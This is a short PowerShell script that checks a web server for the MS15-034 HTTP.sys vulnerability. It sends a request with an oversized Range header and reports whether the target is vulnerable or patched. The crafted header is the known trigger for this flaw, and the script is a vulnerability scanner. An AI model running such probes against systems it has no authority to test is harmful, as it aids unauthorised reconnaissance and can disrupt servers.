##TestMS15_034_powershell脚本
```PS
function TestMS15_034($hostname, $port) 
{
    
    
	if ($port -eq $null)
	{
		$port = 80
	}
    
	$tc = New-Object Net.Sockets.TcpClient
	
	try
	{
		$tc.Connect($hostname, $port)
		$ns = $tc.GetStream()
	    
        	try
        	{
			$sw = New-Object System.IO.StreamWriter($ns)
			$sr = New-Object System.IO.StreamReader($ns)
			
			$req = ""
			$req += "GET / HTTP/1.0`r`n"
			$req += "Host: test`r`n"
			$req += "Range: bytes=0-18446744073709551615`r`n"
			$req += "`r`n"
			
			$sw.Write($req);
			$sw.Flush();
			
			$response = $sr.ReadToEnd()

			if ($response.Contains("Requested Range Not Satisfiable")) 
			{
				Write-Host ("{0}:{1} - VULNERABLE" -f $hostname,$port) -ForegroundColor "Red"
			}
			else
            		{
        			if ($response.Contains("The request has an invalid header name"))
				{
					Write-Host ("{0}:{1} - Patched" -f $hostname,$port) -ForegroundColor "Green"
			    	}
			    	else
			    	{
					Write-Host ("{0}:{1} - Indeterminate" -f $hostname,$port)
				}
            		}
        	}
	        catch
	        {
			Write-Host ("{0}:{1} - Indeterminate: {2}" -f $hostname,$port,$Error[0].Exception.Message) -ForegroundColor "Yellow"
	        }
	        finally
	        {
			$ns.Dispose()
		}
	}
	catch
	{
		Write-Host ("{0}:{1} - Indeterminate: {2}" -f $hostname,$port,$Error[0].Exception.Message) -ForegroundColor "Yellow"
	}
	finally
	{
		$tc.Close();
	}
}

TestMS15_034 -hostname 192.168.1.1 -port 80
```
